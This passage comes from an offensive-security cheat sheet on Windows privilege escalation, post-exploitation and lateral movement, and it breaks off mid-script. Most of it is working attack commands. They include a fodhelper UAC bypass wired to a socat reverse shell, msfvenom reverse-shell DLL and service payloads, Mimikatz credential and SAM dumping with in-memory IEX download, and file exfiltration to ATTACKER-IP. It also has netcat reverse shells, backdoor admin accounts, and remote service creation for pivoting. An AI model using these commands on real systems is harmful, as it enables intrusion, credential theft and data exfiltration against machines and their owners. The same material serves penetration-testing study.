Since any of the above executables is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.

To check if an application has an auto-elevate enabled we can use [**sigcheck**](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)

```
sigcheck64.exe -m path-to-exe
```

The way to use `Auto-Elevate` to let an application execute a reverse shell and bypass UAC is to change the applications' file associations.

When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (**ProgID**) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the **HKEY\_CLASSES\_ROOT** will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID.

In reality, HKEY\_CLASSES\_ROOT is just a merged view of two different paths on the registry: System-wide file associations

```
HKEY_LOCAL_MACHINE\Software\Classes
```

Active user's file associations

```
HKEY_CURRENT_USER\Software\Classes
```

When checking HKEY\_CLASSES\_ROOT, if there is a user-specific association at **HKEY\_CURRENT\_USER (HKCU)**, it will take priority. If no user-specific association is configured, then the system-wide association at **HKEY\_LOCAL\_MACHINE (HKLM)** will be used instead. This way, each user can choose their preferred applications separately if desired.

`The key takeaway here is to find the target application's deginated registry key that handles its file associations. You can do that usually by running the target app and checking through process-monitor or by checking Microsoft official docs for the target app`

_Case study: Fodhelper_ Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. While we've already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

Fodhelper.exe uses the below registry key to handle its file associations

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Given that, We set the required registry values to associate the ms-settings class to a reverse shell. \[1]

```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
```

\[2] Below we uses socat.exe to trigger a reverse shell connection

```
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.10.38.63:4545 EXEC:cmd.exe,pipes"
```

\[3] We need to create an empty value called **DelegateExecute** for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.

```
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```

\[4]

```
nc -lvp 4444
```

And lastly we run the app

```
fodhelper.exe
```

If an AV (Windows Defender) alert is raised then follow the steps above until you reach step \[3] and instead type the below command

```
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".pwn" /f
```

And then execute

```
fodhelper.exe
```

To perform cleanup, execute the below two commands

```
reg delete "HKCU\Software\Classes\.pwn\" /f

reg delete "HKCU\Software\Classes\ms-settings\" /f
```

_**Bypassing AlwaysNotify**_ On default Windows configurations, you can abuse applications related to the system's configuration to bypass UAC as most of these apps have the autoElevate flag set on their manifests. However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate. _**Automated**_ An excellent tool is available to test for UAC bypasses without writing your exploits from scratch.

```
https://github.com/hfiref0x/UACME
```

The repository has a tool named `Akagi` under `Bin` which you can compile and use as shown below.

Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up

```
UACME-Akagi64.exe 33
```

`33` tries the fodhelper.exe method `34` tries the disk cleanup scheduled task `70` tries another variation of fodhelper.exe to bypass AV.

### Automated privilege escalation methods

#### Watson

```
https://github.com/rasta-mouse/Watson
```

To compile the tool, run \[Watson.sln] on your windows machine with visual studio. #Go to visual studio menu -->Project-->Watson Properties. #Make sure \[Application] is selected in the left side panel. #Set the \[Target Framework] according to the .NET framework on the target. #Use the below command to get the version of .NET on the target machine

```
query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

\#Next on visual studio-->Build-->Configuration Manager and set the architecture according to your target \[x86] or \[x64] #Next on visual studio-->Build-->Build Watson. #Your file should be ready.

#### Windows Exploit Suggester

```
https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Update the DB

```
python2 windows-exploit-suggester.py --update
```

Run it

```
python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt
```

The database is an excel file you download from Microsoft.

#### Winpeas

```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```

#### Sherlock

```
https://github.com/rasta-mouse/Sherlock
```

After downloading \[sherlock.ps1] add the below

```
**Find-AllVulns**
```

To the very end of the file to make the script look for all vulnerabilities and missing updates.

#### Powershell Empire

**Download**

```
git clone https://github.com/EmpireProject/Empire.git
```

The file \[PowerUp.ps1] should be edited where you need to add \[**Invoke-AllChecks**] at the very bottom to be able to use it on any target machine.

**Privilege escalation**

The below command will list all privilege escalation vectors that can be used to escalate privileges.

```
Find-AllVulns
```

#### PowerSploit

Link

```
https://github.com/PowerShellMafia/PowerSploit
```

**Harvesting plain text passwords**

```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

**DLL Injection**

First generate malicious DLL with Msfvenom

```
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip LPORT=your-port -f dll > malicious.dll
```

Next we need to PID of the process which will be our target. You can obtain the PID from the task manager or by listing the running processes. Then we invoke the DLL injection module

```
Invoke-DLLInjection -ProcessID PID -Dll C:\path-to-malicous-DLL
```

Note: `make sure you setup your listener in metasploit multi handler module with same settings you used when creating the DLL with msfvenom`

**Unquoted service path**

List information about the running services

```
Get-ServiceDetail
```

List services whose binary can be modified by the current user

```
Get-ModifiableService | more
```

Then we can execute below to change the binary path, restart the service and add the current user to the administrators group.

```
Invoke-ServiceAbuse
```

**DLL Hijacking**

Identifying processes that are using/looking for missing DLLs

```
Find-ProcessDLLHijack
```

Next we identify the folder path of these missing DLLs

```
Find-PathDLLHijack
```

Then we generate and store the malicious DLL

```
Write-HijackDll
```

**Token Impersonation**

**List All Tokens**

```
Invoke-TokenManipulation -ShowAll
```

**List all unique and usable tokens**

```
Invoke-TokenManipulation -Enumerate
```

**Start new process with token of the administrator**

```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\administrator"
```

**Start new process with token of another process**

```
Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

#### PowerUp

**Check for misconfigurations**

```
Invoke-AllChecks
```

**Unquoted Service Path**

```
[1]
Get-ServiceUnquoted -Verbose
[2]
Get-WmiObject -Class win32_service | f` *
```

#### PrivEscCheck

The below is a Powershell script that checks for privilege escalation vectors.

```
https://github.com/itm4n/PrivescCheck
```

Then run the below for basic usage

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

And for extended checks run the below

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```

### Most Popular Kernel Exploits

All can be found in the link below

```
https://github.com/SecWiki/windows-kernel-exploits
```

In case the link above goes down, the list can be found below

* [CVE-2021-33739](https://github.com/mavillon1/CVE-2021-33739-POC) \[Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)
* [CVE-2021-1732](https://github.com/KaLendsi/CVE-2021-1732-Exploit) \[Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)
* [CVE-2020-0787](https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION) \[Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012/2016/2019)
* [CVE-2020-0796](https://github.com/danigargu/CVE-2020-0796) \[A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'] (Windows 1903/1909)
* [CVE-2019-1458](https://github.com/unamer/CVE-2019-1458) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
* [CVE-2019-0803](https://github.com/ExpLife0011/CVE-2019-0803) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016/2019)
* [CVE-2018-8639](https://github.com/ze0r/CVE-2018-8639-exp) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
* [CVE-2018-1038](https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe) \[Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)
* [CVE-2018-0743](https://github.com/saaramar/execve\_exploit) \[Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709/Windows Server version 1709)
* [CVE-2018-8453](https://github.com/ze0r/cve-2018-8453-exp) \[An elevation of privilege vulnerability in Windows Win32k component] (>= windows 8.1)
* [CVE-2018-8440](https://github.com/sourceincite/CVE-2018-8440) \[Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)
* [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-017) 　\[KB4013081]　　\[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
* [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-8464) 　\[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
* [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213) 　\[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
* [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-0833) \[SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)
* [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120) \[Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)
* [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010) 　\[KB4013389]　　\[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
* [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135) 　\[KB3199135]　　\[Windows Kernel Mode Drivers]　　(2016)
* [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-111) 　\[KB3186973]　　\[kernel api]　　(Windows 10 10586 (32/64)/8.1)
* [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098) 　\[KB3178466]　　\[Kernel Driver]　　(Win 8.1)
* [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075) 　\[KB3164038]　　\[Hot Potato]　　(2003/2008/7/8/2012)
* [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-034) 　\[KB3143145]　　\[Kernel Driver]　　(2008/7/8/10/2012)
* [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032) 　\[KB3143141]　　\[Secondary Logon Handle]　　(2008/7/8/10/2012)
* [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-016) 　\[KB3136041]　　\[WebDAV]　　(2008/Vista/7)
* [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-014) 　\[K3134228]　　\[remote code execution]　　(2008/Vista/7)
* [MS15-097](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-097) 　\[KB3089656]　　\[remote code execution]　　(win8.1/2012)
* [MS15-076](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-076) 　\[KB3067505]　　\[RPC]　　(2003/2008/7/8/2012)
* [MS15-077](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-077) 　\[KB3077657]　　\[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)
* [MS15-061](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-061) 　\[KB3057839]　　\[Kernel Driver]　　(2003/2008/7/8/2012)
* [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051) 　\[KB3057191]　　\[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)
* [MS15-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-015) 　\[KB3031432]　　\[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)
* [MS15-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-010) 　\[KB3036220]　　\[Kernel Driver]　　(2003/2008/7/8)
* [MS15-001](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-001) 　\[KB3023266]　　\[Kernel Driver]　　(2008/2012/7/8)
* [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-070) 　\[KB2989935]　　\[Kernel Driver]　　(2003)
* [MS14-068](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068) 　\[KB3011780]　　\[Domain Privilege Escalation]　　(2003/2008/2012/7/8)
* [MS14-058](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058) 　\[KB3000061]　　\[Win32k.sys]　　(2003/2008/2012/7/8)
* [MS14-066](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-066) 　\[KB2992611]　　\[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2 SP1/2012/2012 R2/Windows RT/Windows RT 8.1)
* [MS14-040](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-040) 　\[KB2975684]　　\[AFD Driver]　　(2003/2008/2012/7/8)
* [MS14-002](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-002) 　\[KB2914368]　　\[NDProxy]　　(2003/XP)
* [MS13-053](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-053) 　\[KB2850851]　　\[win32k.sys]　　(XP/Vista/2003/2008/win 7)
* [MS13-046](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-046) 　\[KB2840221]　　\[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)
* [MS13-005](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-005) 　\[KB2778930]　　\[Kernel Mode Driver]　　(2003/2008/2012/win7/8)
* [MS12-042](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS12-042) 　\[KB2972621]　　\[Service Bus]　　(2008/2012/win7)
* [MS12-020](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS12-020) 　\[KB2671387]　　\[RDP]　　(2003/2008/7/XP)
* [MS11-080](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-080) 　\[KB2592799]　　\[AFD.sys]　　(2003/XP)
* [MS11-062](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-062) 　\[KB2566454]　　\[NDISTAPI]　　(2003/XP)
* [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046) 　\[KB2503665]　　\[AFD.sys]　　(2003/2008/7/XP)
* [MS11-011](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-011) 　\[KB2393802]　　\[kernel Driver]　　(2003/2008/7/XP/Vista)
* [MS10-092](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-092) 　\[KB2305420]　　\[Task Scheduler]　　(2008/7)
* [MS10-065](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-065) 　\[KB2267960]　　\[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)
* [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059) 　\[KB982799]　　 \[ACL-Churraskito]　　(2008/7/Vista)
* [MS10-048](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-048) 　\[KB2160329]　　\[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7)
* [MS10-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-015) 　\[KB977165]　　 \[KiTrap0D]　　(2003/2008/7/XP)
* [MS10-012](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-012) 　\[KB971468]　　\[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)
* [MS09-050](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-050) 　\[KB975517]　　 \[Remote Code Execution]　　(2008/Vista)
* [MS09-020](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-020) 　\[KB970483]　　 \[IIS 6.0]　　(IIS 5.1 and 6.0)
* [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012) 　\[KB959454]　　 \[Chimichurri]　　(Vista/win7/2008/Vista)
* [MS08-068](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-068) 　\[KB957097]　　 \[Remote Code Execution]　　(2000/XP)
* [MS08-067](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-067) 　\[KB958644]　　 \[Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)
* [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066) 　\[KB956803]　　 \[AFD.sys]　　(Windows 2000/XP/Server 2003)
* [MS08-025](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-025) 　\[KB941693]　　 \[Win32.sys]　　(XP/2003/2008/Vista)
* [MS06-040](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS06-040) 　\[KB921883]　　 \[Remote Code Execution]　　(2003/xp/2000)
* [MS05-039](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS05-039) 　\[KB899588]　　 \[PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)
* [MS03-026](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS03-026) 　\[KB823980]　　 \[Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)

### Windows Post Exploitation

#### Adding a new user

```
Net user Motasem Motasem /add
```

#### Adding the user to the administrators group

```
Net localgroup /add Administrators Motasem 
```

#### Changing the admin password

```
Net user Administrator [new-pass]
```

#### Enabling RDP to Log-in

This technique is useful when you add a user to the compromised machine and you want to log in with that user using RDP from your machine.

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Then enable RDP in the firewall to allow the incoming connection

```
netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable
```

#### Adding a user to the domain admins group

```
Net group ‘Domain Admins’ /add [user]
```

#### Dumping certificates from target machine with powershell and mimikatz in memory:

On the target machine launch the following:

```
PS> $browser = New-Object System.Net.WebClient
PS> $browser.Proxy.Credentials =
[System.Net.CredentialCache]::DefaultNetworkCredentials
PS>
IEX($browser.DownloadString("https://raw.githubusercontent.Mimikatz.ps1"))
PS> invoke-mimikatz -DumpCerts
```

#### Viewing alternate data streams in a directory

Method \[1] From the command promopt

```
dir /r
```

This shows if any files have hidden streams To view the hidden file, we use the more command. Don't forget to replace the file name with the actual hidden file listed when you issued \[dir /r]

```
more < hm.txt:file.txt
```

Method\[2] Using powershell First we issue the below command on the file that is suspected to contain AIDS or alternate data streams

```
get-item .\hm.txt -stream *
```

An output similar to below is expected !\[\[AIDS-Powershell.jpg]] Then we view the content of the file using the command below

```
get-content .\filename1.txt -stream filename2.txt
```

#### Dumping the SAM Database

The Windows Security Accounts Manager (SAM) database is one of the first places that you are likely to target when you gain access to a Windows system. The SAM contains password hashes that can be easily dumped.

The locations of SYSTEM and SAM are below

```
C:\Windows\System32\config
C:\Windows\Repair 
C:\Windows\System32\config\RegBack
```

**With Meterpreter**

With Metasploit we can use the hashdump.

**With fgdump.exe**

We can also use another tool `fgdump.exe`

```
/usr/share/windows/windows-binaries/fgdump/fgdump.exe
```

Transfer it to the target machine and run it. This will create a dump file which contains the hashes. Then with john the ripper we can crack the hashes

```
john --wordlist=/usr/share/john/password.lst /root/Desktop/hashes.txt
```

**With Mimikatz**

Run Mimikatz

```
mimikatz.exe -m
```

Then run

```
privilege::debug
```

Then execute

```
lsadump::sam

sekurlsa::logonpasswords
```

Note : When the user account that is **running Mimikatz does not have administrative privileges and is therefore unable to access the LSASS service,** Mimikatz will throw the following error:

**Error: ERROR kuhl\_m\_privilege\_simple ; RtlAdjustPrivilege (20) c0000061**

If you’re running the debug command on a shell as NT AUTHORITY/SYSTEM, Mimikatz will also throw an error but it won’t prevent you from accessing LSASS with Mimikatz to dump credentials:

**ERROR kuhl\_m\_privilege\_simple ; RtlAdjustPrivilege (20) c0000022**

### Data Exfiltration

Data exfiltration is getting the data out of the system or network that you’ve compromised. Common exfiltration techniques include covert channels (channels that allow the transfer of data against policy) like hiding data in encrypted web traffic to innocuous-appearing or commonly used sites like Google, GitHub, or even YouTube, Facebook, or Instagram, where steganography techniques that hide data in images or video may be used, sending data via email, or by abusing protocols like DNS. **Exfiltration to a Webserver with PowerShell** The below command will send the `master.zip` file to a webserver hosted by the attacker. Make sure to change the parameters to fit your environment.

```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $server="""http://ATTACKER-IP/upload-path""";$filepath="""C:\rnaster.zip""";$http= new=object System.Net.WebClient;
$response=$http.UploadFile($server,$filepath);"
```

### Lateral Movement

Pivoting is discovering other networks or hosts that were not visible before compromising the system. An example would be an attacker compromising a webserver and then scanning the network again from within the webserver machine to discover other subnets and hosts to pivot into.

Lateral movement in windows or pivoting is best achieved with two protocols: 1- RPC (Remote Procedure Call) Ports 135 and 49152 by creating services. Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards. We can create and start a service named "HACK" using the following commands

```
sc.exe \\TARGET create HACK binPath= "net user hacker hackerpass /add" start= auto

sc.exe \\TARGET start HACK
```

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output. Alternatively you can create a service binary payload with Msfvenom

```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

Then we can use `smbclient` to upload this service binary to the other target's admin share

```
smbclient -c 'put myservice.exe' -U username -W cn '//target2.cn.example.com/admin$/' password
```

Make sure our listener is running in Metasploit

```
user@AttackBox$ msfconsole msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set LHOST ip 
msf6 exploit(multi/handler) > set LPORT 4444 msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp 
msf6 exploit(multi/handler) > exploit
```

Then  we can use runas to spawn a second reverse shell

```
C:\> runas /netonly /user:domain\username "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

And it should be received on your listener

```
nc -lvp 4443
```

Finally from this session, we can proceed to create a new service remotely by using sc, associating it with our uploaded binary

```
C:\> sc.exe \\computername.domain create HACK binPath= "%windir%\myservice.exe" start= auto 

C:\> sc.exe \\computername.domain start HACK
```

To stop and delete the service, we can then execute the following commands

```
sc.exe \\TARGET stop HACK

sc.exe \\TARGET delete HACK
```

2- Remote Powershell (Winrm) Port 5985-5986. Both allow for execution of commands and requires Remote Management Users membership. We can use below command

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

3- Psexec: Port 445 and requires Administrators group membership. You can execute below command from the compromised machine to launch psexec.exe and execute system commands on other remote hosts

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### Using PLINK.EXE

Post compromising a windows-based server, you may need to interact with local ports on the same machine or different machine thus we use \[Plink.exe]. It can also be used if you found an open port on the target machine which you can't interact with from your kali machine because it may be blocked by the firewall. Transnfer it to the target machine and run the command on the windows victim.

```
C:\cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

\[10.11.0.4] is your kali machine ip address. Make sure you run \[SSH server] on your kali machine. This will establish SSH tunnel between windows and kali through which any connection to kali will be redirected to windows on port \[3306] which is blocked by the firewall. #On Kali machine, we can run the nmap scan to interact with port \[3306] on the windows server

```
root@kali:~$sudo nmap -sS -sV 127.0.0.1 -p 1234
```

#### Using NetSH.EXE

We use this tool if we have compromised a windows client and after elevating privileges to SYSTEM. Another requirement is that \[IP Helper service] must be running and \[IPV6 support] must be turned on in network adapter settings. The scenario here is that you have compromised a windows 10 machine that is part of a domain controller. Say it's windows server 2016. Windows server 2016 which is the domain controller is running services internally on ports you can't interact with from your kali machine thus you use \[NetSh.exe]. Transfer it to the Windows 10 machine. #The following command will redirect connections from the compromised windows client to the windows 2016 server running the port which is blocked by the firewall. This command is run on the compromised windows 10:

```
C:\netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```

\[10.11.0.22] IP of the compromised windows client \[192.168.1.110] IP of the windows server 2016 machine #Next step is allowing inbound connections on port \[445] with a specific windows firewall rule on the windows 10 machine.

```
C:\netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

\#On the kali machine, we need to enable or configure Samba with \[SMBV2]

```
root@kali:~$sudo nano /etc/samba/smb.conf
root@kali:~$cat /etc/samba/smb.conf
```

Add

```
min protocol = SMB2
```

Restart \[SMB]

```
root@kali:~$sudo /etc/init.d/smbd restart
```

Now we can run samba client on kali machine to enumerate shares on the windows server 2016

```
root@kali:~$smbclient -L 10.11.0.22 --port=4455 --user=Administrator
```

\[10.11.0.22] IP of the compromised windows 10 Then we interact with the shares and mount them.

```
root@kali:~$sudo mkdir /mnt/win10_share
```

Suppose we found //Data share, we can dump it to our kali machine

```
root@kali:~$sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator ,password=Qwerty09! /mnt/win10_share
```

#### Using Socat

Socat can be used in scenarios where you discovered a machine running on a different network than the network in which the compromised machine resides. For example you compromised a machine whose ip is \[10.10.10.5] and you found another machine on \[172.16.1.6] which you can't reach from your kali machine. In this case, we use socat to forward the desired ports. Say the machine on \[172.16.1.6] has \[8080] port open. We can interact with it by making the machine \[10.10.10.5] listens on for example port \[60333] so that it forwards all incoming connections on port \[60333] to port \[8080] on \[172.16.1.6]

```
./socat tcp-listen:60333,reuseaddr,fork tcp:10.10.10.5:8080 &
```

Now from your kali box, you can start sending traffic and interacting with port \[8080] by including the port \[60333] in all your commands. For example, enumerating directories on \[10.10.10.5]

```
gobuster -u http://172.16.1.6:60333 -w [wordlist]
```

\#Another #example would be interacting with \[win-rm] port \[5986] on the machine to which we want to pivot. In that case, we perform the socat commands listed above along with the below script to get \[powershell] on the pivoted machine. #Note For this to work, you need the credentials of the pivoted machine. The below script is authored by user \[Alamot]

```powershell
require 'winrm-fs'

# Author: Alamot

# To upload a file type: UPLOAD local_path remote_path

# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt

conn = WinRM::Connection.new(

endpoint: 'https://IP:PORT/wsman',

transport: :ssl,

user: 'username',

password: 'password',

:no_ssl_peer_verification => true

)

file_manager = WinRM::FS::FileManager.new(conn)

class String

def tokenize

self.

split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).

select {|s| not s.empty? }.

map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}

end

end

command=""

conn.shell(:powershell) do |shell|

until command == "exit\n" do

output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")

print(output.output.chomp)

command = gets

if command.start_with?('UPLOAD') then

upload_command = command.tokenize

print("Uploading " + upload_command[1] + " to " + upload_command[2])

file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|

puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")

end

command = "echo `nOK`n"

end

output = shell.run(command) do |stdout, stderr|

STDOUT.print(stdout)

STDERR.print(stderr)

end

end

puts("Exiting with code #{output.exitcode}")

end
```

The above script can also further be changed to include executing powershell reverseshell so that other machines would connect back to a listener you may create. #Note For this to work First you need the credentials of the first pivoted machine \[10.10.10.5] to establish the \[winrm] connection. Second, you need the credentials of the other pivoted machine. The below script when executed will connect back to another listner you run on your machine.

```powershell
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'https://ip:port/wsman',
  transport: :ssl,
  user: 'username',
  password: 'pass',
  :no_ssl_peer_verification => true
)

conn.shell(:powershell) do |shell|
